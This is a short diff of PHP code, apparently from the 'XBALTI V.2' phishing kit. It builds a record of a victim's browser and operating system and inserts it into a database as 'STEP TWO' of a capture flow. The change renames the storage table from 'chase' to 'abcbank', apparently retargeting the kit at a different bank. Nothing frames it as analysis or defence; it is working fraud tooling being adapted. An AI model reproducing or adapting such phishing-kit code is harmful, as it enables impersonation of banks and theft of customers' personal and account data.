@@ -53,7 +53,7 @@ $XBALTI_MESSAGE .= "
 <font style='color:#9c0000;'>😈</font> [BROWSER]      = <font style='color:#0070ba;'>".XBALTI_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XBALTI_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
 ------------------ <font style='color: #820000;'>BY XBALTI V.2</font> ------------------</div></html>\n";
 $XBALTI_MESSAGE=mysqli_real_escape_string($conn,$XBALTI_MESSAGE);
-$insert = mysqli_query($conn,"INSERT INTO chase(al,step) VALUES('$XBALTI_MESSAGE','STEP TWO')");
+$insert = mysqli_query($conn,"INSERT INTO abcbank (al,step) VALUES('$XBALTI_MESSAGE','STEP TWO')");
 if(!$insert){
     echo "ERROR";
 }
